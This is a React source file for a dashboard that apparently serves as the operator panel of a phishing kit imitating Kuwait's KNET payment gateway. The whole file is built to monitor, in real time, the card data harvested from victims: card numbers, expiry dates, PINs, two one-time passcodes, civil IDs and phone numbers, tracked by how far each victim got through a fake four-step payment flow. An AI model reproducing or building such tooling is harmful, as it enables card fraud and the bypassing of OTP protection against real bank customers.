import { useState, useEffect } from "react";
import { base44 } from "@/api/base44Client";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { RefreshCw, CreditCard, User, Phone, Hash, Calendar, Building2, Wifi } from "lucide-react";

const STEP_LABELS = { 1: "Card Info", 2: "OTP 1", 3: "ID & Phone", 4: "OTP 2" };
const STEP_COLORS = {
  1: "bg-blue-100 text-blue-700",
  2: "bg-yellow-100 text-yellow-700",
  3: "bg-orange-100 text-orange-700",
  4: "bg-green-100 text-green-700",
};

export default function Dashboard() {
  const [records, setRecords] = useState([]);
  const [loading, setLoading] = useState(true);

  const fetchRecords = async () => {
    setLoading(true);
    const data = await base44.entities.PaymentRecord.list("-created_date", 100);
    setRecords(data);
    setLoading(false);
  };

  useEffect(() => {
    fetchRecords();
    const unsub = base44.entities.PaymentRecord.subscribe((event) => {
      if (event.type === "create") {
        setRecords(prev => [event.data, ...prev]);
      } else if (event.type === "update") {
        setRecords(prev => prev.map(r => r.id === event.id ? event.data : r));
      } else if (event.type === "delete") {
        setRecords(prev => prev.filter(r => r.id !== event.id));
      }
    });
    return unsub;
  }, []);

  const totalAmount = records.reduce((sum, r) => sum + (parseFloat(r.amount) || 0), 0);

  return (
    <div className="min-h-screen bg-background p-6" dir="ltr">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-6">
          <div>
            <h1 className="text-2xl font-bold text-foreground">Payment Records Dashboard</h1>
            <p className="text-sm text-muted-foreground mt-1">Real-time KNET submission monitor</p>
          </div>
          <button
            onClick={fetchRecords}
            className="flex items-center gap-2 bg-primary text-primary-foreground px-4 py-2 rounded-md text-sm font-bold hover:bg-primary/90 transition-all"
          >
            <RefreshCw className={`h-4 w-4 ${loading ? "animate-spin" : ""}`} />
            Refresh
          </button>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
          <Card>
            <CardContent className="p-4">
              <div className="text-xs text-muted-foreground">Total Records</div>
              <div className="text-2xl font-bold text-foreground">{records.length}</div>
            </CardContent>
          </Card>
          <Card>
            <CardContent className="p-4">
              <div className="text-xs text-muted-foreground">Total Amount (KD)</div>
              <div className="text-2xl font-bold text-destructive">{totalAmount.toFixed(3)}</div>
            </CardContent>
          </Card>
          <Card>
            <CardContent className="p-4">
              <div className="text-xs text-muted-foreground">Completed (Step 4)</div>
              <div className="text-2xl font-bold text-green-600">{records.filter(r => r.step_reached >= 4).length}</div>
            </CardContent>
          </Card>
          <Card>
            <CardContent className="p-4">
              <div className="text-xs text-muted-foreground">In Progress</div>
              <div className="text-2xl font-bold text-yellow-600">{records.filter(r => r.step_reached < 4).length}</div>
            </CardContent>
          </Card>
        </div>

        {/* Records Table */}
        {loading ? (
          <div className="flex items-center justify-center py-20">
            <RefreshCw className="h-8 w-8 animate-spin text-muted-foreground" />
          </div>
        ) : records.length === 0 ? (
          <Card>
            <CardContent className="p-12 text-center text-muted-foreground">No records yet.</CardContent>
          </Card>
        ) : (
          <div className="space-y-3">
            {records.map((r) => (
              <Card key={r.id} className="border-border shadow-sm hover:shadow-md transition-shadow">
                <CardContent className="p-5">
                  <div className="flex items-start justify-between mb-3">
                    <div className="flex items-center gap-3">
                      <Badge className={`text-xs font-bold border-none ${STEP_COLORS[r.step_reached] || "bg-muted text-muted-foreground"}`}>
                        Step {r.step_reached}: {STEP_LABELS[r.step_reached] || "Unknown"}
                      </Badge>
                      <span className="text-xs text-muted-foreground">
                        {r.created_date ? new Date(r.created_date).toLocaleString() : ""}
                      </span>
                    </div>
                    <div className="text-lg font-extrabold text-destructive">{r.amount} <span className="text-xs font-normal text-muted-foreground">KD</span></div>
                  </div>

                  <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
                    {r.civil_id && (
                      <Field icon={<User className="h-3.5 w-3.5" />} label="Civil ID" value={r.civil_id} />
                    )}
                    {r.bank && (
                      <Field icon={<Building2 className="h-3.5 w-3.5" />} label="Bank" value={r.bank} />
                    )}
                    {r.card_number && (
                      <Field icon={<CreditCard className="h-3.5 w-3.5" />} label="Card" value={`${r.card_prefix || ""} ${r.card_number}`} />
                    )}
                    {(r.expiry_month || r.expiry_year) && (
                      <Field icon={<Calendar className="h-3.5 w-3.5" />} label="Expiry" value={`${r.expiry_month || ""}/${r.expiry_year || ""}`} />
                    )}
                    {r.pin && (
                      <Field icon={<Hash className="h-3.5 w-3.5" />} label="PIN" value={r.pin} sensitive />
                    )}
                    {r.otp1 && (
                      <Field icon={<Hash className="h-3.5 w-3.5" />} label="OTP 1" value={r.otp1} highlight />
                    )}
                    {r.id_number && (
                      <Field icon={<User className="h-3.5 w-3.5" />} label="ID Number" value={r.id_number} />
                    )}
                    {r.phone_number && (
                      <Field icon={<Phone className="h-3.5 w-3.5" />} label="Phone" value={r.phone_number} />
                    )}
                    {r.network && (
                      <Field icon={<Wifi className="h-3.5 w-3.5" />} label="Network" value={r.network} />
                    )}
                    {r.otp2 && (
                      <Field icon={<Hash className="h-3.5 w-3.5" />} label="OTP 2" value={r.otp2} highlight />
                    )}
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

function Field({ icon, label, value, sensitive, highlight }) {
  const [show, setShow] = useState(!sensitive);
  return (
    <div className={`rounded-lg px-3 py-2 ${highlight ? "bg-yellow-50 border border-yellow-200" : "bg-muted/50"}`}>
      <div className="flex items-center gap-1 text-[10px] text-muted-foreground mb-0.5">
        {icon}
        {label}
      </div>
      <div className="flex items-center gap-1">
        <span className={`text-xs font-bold text-foreground ${highlight ? "text-yellow-700" : ""}`}>
          {sensitive && !show ? "••••" : value}
        </span>
        {sensitive && (
          <button onClick={() => setShow(s => !s)} className="text-[10px] text-primary ml-1">{show ? "hide" : "show"}</button>
        )}
      </div>
    </div>
  );
}